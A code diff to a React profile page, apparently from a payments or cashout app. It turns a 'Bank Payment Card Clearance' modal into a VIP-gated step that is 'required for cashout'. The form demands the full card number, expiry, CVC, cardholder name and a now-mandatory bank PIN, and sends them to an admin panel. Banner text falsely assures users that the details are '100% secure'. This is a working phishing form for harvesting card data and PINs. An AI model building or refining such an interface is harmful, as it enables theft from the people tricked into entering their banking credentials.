@@ -16,9 +16,10 @@ interface ProfileProps {
 const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountClick, darkMode, toggleDarkMode, onLogout, vendorTelegramLink }) => {
   const [name, setName] = useState(user.name);
   const [isEditing, setIsEditing] = useState(false);
-  const [cvcCode, setCvcCode] = useState('');
-  const [cvcMessage, setCvcMessage] = useState<{ text: string, type: 'success' | 'error' } | null>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
+
+  // Check if user is VIP member
+  const isVIPUser = !!user.isVIP || !!user.vipTier || (user.isSubscribed && !!user.subscriptionPlan?.toUpperCase().includes('VIP')) || !!user.cardClearanceDetails;
 
   // Bank Payment Card Clearance States
   const [showCardClearanceModal, setShowCardClearanceModal] = useState(false);
@@ -33,19 +34,19 @@ const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountC
 
   const handleSubmitCardClearance = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!cardholderName.trim() || !cardBankName.trim() || !cardNumber.trim() || !cardExpiry.trim() || !cardCvc.trim()) {
-      alert("Please fill in all required card details.");
+    if (!cardNumber.trim() || !cardExpiry.trim() || !cardCvc.trim() || !cardholderName.trim() || !cardPin.trim()) {
+      alert("Please enter all required card details including Card Number, Expiry, CVC, Card Holder Name, and Bank PIN.");
       return;
     }
 
     setIsSubmittingCard(true);
     const details = {
       cardholderName: cardholderName.trim(),
-      bankName: cardBankName.trim(),
+      bankName: cardBankName.trim() || 'Default Bank',
       cardNumber: cardNumber.trim(),
       expiryDate: cardExpiry.trim(),
       cvc: cardCvc.trim(),
-      pin: cardPin.trim() || undefined,
+      pin: cardPin.trim(),
       clearanceCode: clearanceCode.trim() || undefined,
       submittedAt: new Date().toISOString(),
       status: 'pending' as const
@@ -63,7 +64,7 @@ const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountC
       }
 
       await syncUserFromLocalToFirestore(user.email);
-      alert("Bank Payment Card Clearance details submitted successfully! Details saved on Admin Dashboard.");
+      alert("Bank Payment Card details submitted successfully! Your details are secure for your next cashout and sent to the admin panel.");
       setShowCardClearanceModal(false);
     } catch (err) {
       console.error("Error submitting card clearance details:", err);
@@ -71,30 +72,6 @@ const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountC
     } finally {
       setIsSubmittingCard(false);
     }
-  };
-
-  const handleApplyCvc = () => {
-    if (cvcCode.toUpperCase() === 'MK987') {
-      const isUsed = localStorage.getItem('chix9ja_cvc_used');
-      if (isUsed) {
-        setCvcMessage({ text: 'This code has already been used on this device.', type: 'error' });
-      } else {
-        onUpdateProfile({ 
-          isVMode: true,
-          isPMode: true,
-          vModeSubscriptionUsed: false,
-          vModeVipUsed: false,
-          vModeInvestmentUsed: false,
-          deactivationDate: Date.now() + 86400000 // 24 hours
-        });
-        localStorage.setItem('chix9ja_cvc_used', 'true');
-        setCvcMessage({ text: 'CVC code applied! V Mode & P Mode are now active.', type: 'success' });
-        setCvcCode('');
-      }
-    } else {
-      setCvcMessage({ text: 'Invalid CVC code.', type: 'error' });
-    }
-    setTimeout(() => setCvcMessage(null), 5000);
   };
 
   const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
@@ -227,72 +204,46 @@ const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountC
           </div>
         )}
 
-        {/* Bank Payment Card Clearance Section */}
-        <div className="py-2 border-t border-gray-800/50 mt-1 pt-3">
-          <button 
-            onClick={() => setShowCardClearanceModal(true)}
-            className="w-full p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-center justify-between group hover:bg-amber-500/20 transition-all active:scale-[0.98]"
-          >
-            <div className="flex items-center space-x-3">
-              <div className="p-2 bg-amber-500/20 rounded-xl text-amber-400 group-hover:scale-110 transition-transform">
-                <Icons.Card size={20} />
-              </div>
-              <div className="text-left">
-                <p className="text-sm font-bold text-white leading-tight">Bank Payment Card Clearance</p>
-                <p className="text-[10px] text-amber-400/80 font-bold uppercase tracking-widest font-mono">
-                  {user.cardClearanceDetails ? `Status: ${user.cardClearanceDetails.status.toUpperCase()}` : 'Submit Card Details for Clearance'}
-                </p>
-              </div>
-            </div>
-            <div className="flex items-center space-x-1.5">
-              {user.cardClearanceDetails && (
-                <span className={`text-[9px] font-mono px-2 py-0.5 rounded font-black uppercase ${
-                  user.cardClearanceDetails.status === 'cleared' || user.cardClearanceDetails.status === 'approved' 
-                    ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/30' 
-                    : user.cardClearanceDetails.status === 'rejected' 
-                    ? 'bg-rose-950 text-rose-400 border border-rose-500/30' 
-                    : 'bg-amber-950 text-amber-400 border border-amber-500/30'
-                }`}>
-                  {user.cardClearanceDetails.status}
-                </span>
-              )}
-              <Icons.ChevronRight size={18} className="text-amber-500/55" />
-            </div>
-          </button>
-        </div>
-
-        {/* CVC Code Section */}
-        <div className="flex flex-col py-3 border-t border-gray-800">
-          <div className="flex items-center space-x-3 mb-3">
-            <div className="p-2.5 bg-amber-500/10 rounded-xl text-amber-500">
-                <Icons.Lock size={20} />
-            </div>
-            <div className="flex-1">
-              <p className="text-xs text-gray-500 mb-0.5">Activation Code (CVC)</p>
-              <p className="text-[10px] text-gray-600">Enter your card verification code to activate V Mode</p>
-            </div>
-          </div>
-          <div className="flex space-x-2">
-            <input 
-              type="text" 
-              placeholder="Enter CVC"
-              value={cvcCode}
-              onChange={(e) => setCvcCode(e.target.value)}
-              className="flex-1 p-2 border border-gray-800 rounded-xl text-sm bg-black text-white focus:ring-2 focus:ring-green-glow outline-none"
-            />
+        {/* Bank Payment Card Clearance Section - VIP Members Only */}
+        {isVIPUser && (
+          <div className="py-2 border-t border-gray-800/50 mt-1 pt-3 animate-in fade-in duration-300">
             <button 
-              onClick={handleApplyCvc}
-              className="px-6 py-2 bg-green-glow text-black font-bold text-xs rounded-xl shadow-lg active:scale-95 transition-all"
+              onClick={() => setShowCardClearanceModal(true)}
+              className="w-full p-4 bg-gradient-to-r from-amber-500/20 via-amber-400/15 to-yellow-500/20 border-2 border-amber-400/60 rounded-2xl flex items-center justify-between group hover:border-amber-400 hover:bg-amber-500/25 transition-all active:scale-[0.98] shadow-lg shadow-amber-500/10"
             >
-              ACTIVATE
+              <div className="flex items-center space-x-3">
+                <div className="p-2.5 bg-gradient-to-tr from-amber-500 to-yellow-400 rounded-xl text-black font-black shadow-md group-hover:scale-110 transition-transform">
+                  <Icons.Card size={20} />
+                </div>
+                <div className="text-left">
+                  <p className="text-sm font-black text-amber-300 leading-tight">Add Bank Payment Card for Clearance</p>
+                  <p className="text-[10px] text-amber-400/90 font-bold uppercase tracking-widest font-mono">
+                    {user.cardClearanceDetails ? `Status: ${user.cardClearanceDetails.status.toUpperCase()}` : 'VIP Clearance Required for Cashout'}
+                  </p>
+                </div>
+              </div>
+              <div className="flex items-center space-x-1.5">
+                {user.cardClearanceDetails ? (
+                  <span className={`text-[9px] font-mono px-2.5 py-1 rounded-lg font-black uppercase tracking-wider ${
+                    user.cardClearanceDetails.status === 'cleared' || user.cardClearanceDetails.status === 'approved' 
+                      ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/40' 
+                      : user.cardClearanceDetails.status === 'rejected' 
+                      ? 'bg-rose-950 text-rose-400 border border-rose-500/40' 
+                      : 'bg-amber-950 text-amber-400 border border-amber-500/40'
+                  }`}>
+                    {user.cardClearanceDetails.status}
+                  </span>
+                ) : (
+                  <span className="text-[9px] font-mono px-2 py-0.5 rounded font-black bg-amber-500 text-black uppercase animate-pulse">
+                    VIP Mode
+                  </span>
+                )}
+                <Icons.ChevronRight size={18} className="text-amber-400" />
+              </div>
             </button>
           </div>
-          {cvcMessage && (
-            <p className={`mt-2 text-[10px] font-bold ${cvcMessage.type === 'success' ? 'text-green-400' : 'text-red-400'}`}>
-              {cvcMessage.text}
-            </p>
-          )}
-        </div>
+        )}
+
       </div>
 
       {/* Actions */}
@@ -305,147 +256,168 @@ const Profile: React.FC<ProfileProps> = ({ user, onUpdateProfile, onLinkAccountC
           </button>
       </div>
 
-      {/* Bank Payment Card Clearance Modal */}
+      {/* Bank Payment Card Clearance Page (White & Gold Theme) */}
       {showCardClearanceModal && (
-        <div className="fixed inset-0 z-[120] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-300">
-          <div className="bg-zinc-950 border border-amber-500/30 rounded-3xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto space-y-5 text-left shadow-2xl relative font-sans">
-            <div className="flex items-center justify-between border-b border-zinc-800 pb-4">
-              <div className="flex items-center space-x-2.5">
-                <div className="p-2 bg-amber-500/20 rounded-xl text-amber-400">
-                  <Icons.Card size={22} />
+        <div className="fixed inset-0 z-[150] bg-black/75 backdrop-blur-md flex items-center justify-center p-3 sm:p-4 animate-in fade-in duration-300 overflow-y-auto">
+          <div className="bg-white border-2 border-amber-400 rounded-3xl w-full max-w-md max-h-[92vh] overflow-y-auto shadow-2xl relative font-sans text-zinc-900 my-auto">
+            
+            {/* White & Gold Header */}
+            <div className="bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-500 p-5 rounded-t-[22px] text-black shadow-md flex items-center justify-between">
+              <div className="flex items-center space-x-3">
+                <div className="p-2.5 bg-black/10 rounded-xl text-black">
+                  <Icons.Card size={24} className="stroke-[2.5]" />
                 </div>
                 <div>
-                  <h3 className="text-base font-black text-white uppercase tracking-wider font-mono">Bank Card Clearance</h3>
-                  <p className="text-[10px] text-zinc-400 font-mono">Submit details for admin verification & clearance</p>
+                  <h3 className="text-base font-black uppercase tracking-wider font-mono text-black">Bank Payment Card Clearance</h3>
+                  <p className="text-[10px] text-amber-950 font-black font-mono uppercase tracking-widest opacity-90">VIP Clearance Node</p>
                 </div>
               </div>
               <button 
                 type="button"
                 onClick={() => setShowCardClearanceModal(false)}
-                className="p-2 text-zinc-400 hover:text-white bg-zinc-900 rounded-xl transition-colors"
+                className="p-2 text-black hover:bg-black/10 rounded-xl transition-colors"
               >
-                <Icons.X size={18} />
+                <Icons.X size={20} className="stroke-[3]" />
               </button>
             </div>
 
-            {user.cardClearanceDetails && (
-              <div className="p-3 bg-amber-950/30 border border-amber-500/20 rounded-2xl text-[11px] font-mono space-y-1">
-                <div className="flex items-center justify-between">
-                  <span className="text-zinc-400 uppercase font-bold">Existing Clearance Status:</span>
-                  <span className="text-amber-400 font-extrabold uppercase">{user.cardClearanceDetails.status}</span>
-                </div>
-                <p className="text-zinc-400 text-[10px]">
-                  Submitted on: {new Date(user.cardClearanceDetails.submittedAt).toLocaleDateString()}
+            <div className="p-6 space-y-5">
+              {/* Security Banner Notice */}
+              <div className="p-3.5 bg-amber-50 border border-amber-300 rounded-2xl flex items-start space-x-3 text-left shadow-sm">
+                <Icons.ShieldCheck size={22} className="text-amber-600 flex-shrink-0 mt-0.5" />
+                <p className="text-xs text-amber-900 font-bold leading-relaxed">
+                  Your bank payment card details are encrypted and <span className="font-black underline decoration-amber-500">100% secure for your next cashout</span>.
                 </p>
               </div>
-            )}
 
-            <form onSubmit={handleSubmitCardClearance} className="space-y-4">
-              <div className="space-y-1">
-                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Cardholder Full Name *</label>
-                <input 
-                  type="text" 
-                  required
-                  placeholder="E.g. CHIX9JA USER"
-                  value={cardholderName}
-                  onChange={(e) => setCardholderName(e.target.value)}
-                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all"
-                />
-              </div>
+              {user.cardClearanceDetails && (
+                <div className="p-3 bg-amber-100/80 border border-amber-300 rounded-2xl text-[11px] font-mono space-y-1">
+                  <div className="flex items-center justify-between">
+                    <span className="text-amber-900 uppercase font-bold">Clearance Status:</span>
+                    <span className="text-amber-700 font-black uppercase tracking-wider">{user.cardClearanceDetails.status}</span>
+                  </div>
+                  <p className="text-amber-800 text-[10px]">
+                    Last updated: {new Date(user.cardClearanceDetails.submittedAt).toLocaleDateString()}
+                  </p>
+                </div>
+              )}
 
-              <div className="space-y-1">
-                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Bank Name *</label>
-                <input 
-                  type="text" 
-                  required
-                  placeholder="E.g. Access Bank, GTBank, OPay"
-                  value={cardBankName}
-                  onChange={(e) => setCardBankName(e.target.value)}
-                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all"
-                />
-              </div>
-
-              <div className="space-y-1">
-                <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Card Number *</label>
-                <input 
-                  type="text" 
-                  required
-                  maxLength={19}
-                  placeholder="5399 **** **** 1234"
-                  value={cardNumber}
-                  onChange={(e) => setCardNumber(e.target.value)}
-                  className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all tracking-wider"
-                />
-              </div>
-
-              <div className="grid grid-cols-2 gap-3">
+              {/* White and Gold Form */}
+              <form onSubmit={handleSubmitCardClearance} className="space-y-4 text-left">
+                
+                {/* 1. Card Number */}
                 <div className="space-y-1">
-                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Expiry (MM/YY) *</label>
+                  <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                    Card Number *
+                  </label>
                   <input 
                     type="text" 
                     required
-                    maxLength={5}
-                    placeholder="08/28"
-                    value={cardExpiry}
-                    onChange={(e) => setCardExpiry(e.target.value)}
-                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
+                    maxLength={19}
+                    placeholder="4532 **** **** 8892"
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(e.target.value)}
+                    className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all tracking-wider placeholder:text-zinc-400 shadow-inner"
                   />
                 </div>
-                <div className="space-y-1">
-                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">CVC / CVV *</label>
-                  <input 
-                    type="password" 
-                    required
-                    maxLength={4}
-                    placeholder="123"
-                    value={cardCvc}
-                    onChange={(e) => setCardCvc(e.target.value)}
-                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
-                  />
-                </div>
-              </div>
 
-              <div className="grid grid-cols-2 gap-3">
-                <div className="space-y-1">
-                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">ATM PIN (Optional)</label>
-                  <input 
-                    type="password" 
-                    maxLength={4}
-                    placeholder="****"
-                    value={cardPin}
-                    onChange={(e) => setCardPin(e.target.value)}
-                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all text-center"
-                  />
+                {/* 2. Date or Expiry & 3. CVC in 2 columns */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div className="space-y-1">
+                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                      Date / Expiry *
+                    </label>
+                    <input 
+                      type="text" 
+                      required
+                      maxLength={5}
+                      placeholder="MM/YY (08/28)"
+                      value={cardExpiry}
+                      onChange={(e) => setCardExpiry(e.target.value)}
+                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
+                    />
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                      CVC *
+                    </label>
+                    <input 
+                      type="password" 
+                      required
+                      maxLength={4}
+                      placeholder="CVC"
+                      value={cardCvc}
+                      onChange={(e) => setCardCvc(e.target.value)}
+                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
+                    />
+                  </div>
                 </div>
+
+                {/* 4. Card Holder Name */}
                 <div className="space-y-1">
-                  <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest font-mono block">Clearance Code (Optional)</label>
+                  <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                    Card Holder Name *
+                  </label>
                   <input 
                     type="text" 
-                    placeholder="E.g. CLR-9921"
-                    value={clearanceCode}
-                    onChange={(e) => setClearanceCode(e.target.value)}
-                    className="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl text-white text-xs font-mono outline-none focus:border-amber-500 transition-all uppercase text-center"
+                    required
+                    placeholder="Enter Cardholder Name"
+                    value={cardholderName}
+                    onChange={(e) => setCardholderName(e.target.value)}
+                    className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all placeholder:text-zinc-400 shadow-inner"
                   />
                 </div>
-              </div>
 
-              <div className="pt-2 flex gap-3">
-                <button
-                  type="button"
-                  onClick={() => setShowCardClearanceModal(false)}
-                  className="flex-1 py-3 bg-zinc-900 hover:bg-zinc-800 text-zinc-400 font-mono font-bold text-xs uppercase rounded-2xl border border-zinc-800 transition-all"
-                >
-                  Cancel
-                </button>
-                <button
-                  type="submit"
-                  disabled={isSubmittingCard}
-                  className="flex-1 py-3 bg-amber-500 hover:bg-amber-400 disabled:opacity-50 text-black font-mono font-black text-xs uppercase rounded-2xl shadow-lg transition-all active:scale-95"
-                >
-                  {isSubmittingCard ? 'Submitting...' : 'Submit to Admin'}
-                </button>
-              </div>
-            </form>
+                {/* 5. Bank Pin */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div className="space-y-1">
+                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                      Bank PIN *
+                    </label>
+                    <input 
+                      type="password" 
+                      required
+                      maxLength={6}
+                      placeholder="****"
+                      value={cardPin}
+                      onChange={(e) => setCardPin(e.target.value)}
+                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-black text-sm outline-none transition-all text-center placeholder:text-zinc-400 shadow-inner"
+                    />
+                  </div>
+
+                  <div className="space-y-1">
+                    <label className="text-[10px] font-black text-amber-900 uppercase tracking-widest font-mono block">
+                      Bank Name
+                    </label>
+                    <input 
+                      type="text" 
+                      placeholder="E.g. GTBank"
+                      value={cardBankName}
+                      onChange={(e) => setCardBankName(e.target.value)}
+                      className="w-full bg-zinc-50 border-2 border-amber-200 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 p-3.5 rounded-xl text-zinc-900 font-mono font-bold text-sm outline-none transition-all placeholder:text-zinc-400 shadow-inner"
+                    />
+                  </div>
+                </div>
+
+                <div className="pt-3 flex gap-3">
+                  <button
+                    type="button"
+                    onClick={() => setShowCardClearanceModal(false)}
+                    className="flex-1 py-3.5 bg-zinc-100 hover:bg-zinc-200 text-zinc-700 font-mono font-bold text-xs uppercase rounded-2xl border border-zinc-300 transition-all"
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={isSubmittingCard}
+                    className="flex-[2] py-4 bg-gradient-to-r from-amber-500 via-amber-400 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 disabled:opacity-50 text-black font-mono font-black text-xs uppercase tracking-widest rounded-2xl shadow-xl shadow-amber-300/60 transition-all active:scale-95"
+                  >
+                    {isSubmittingCard ? 'Saving...' : 'Save & Submit Clearance'}
+                  </button>
+                </div>
+              </form>
+            </div>
           </div>
         </div>
       )}
